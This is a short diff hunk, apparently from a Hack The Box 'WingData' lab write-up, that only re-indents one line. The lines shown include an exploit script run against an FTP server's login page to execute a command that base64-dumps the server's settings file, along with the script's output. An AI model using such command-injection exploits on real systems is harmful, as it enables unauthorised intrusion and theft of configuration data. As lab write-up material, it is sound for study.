@@ -547,7 +547,7 @@ YmxlUG9ydFVQblA+CjwvQWRtaW5pc3RyYXRvcj4K
 ```
 
 ```
-ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/settings.xml"
+	ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/settings.xml"
 
 [*] Testing target: http://ftp.wingdata.htb
 [+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/settings.xml' and username: 'anonymous'
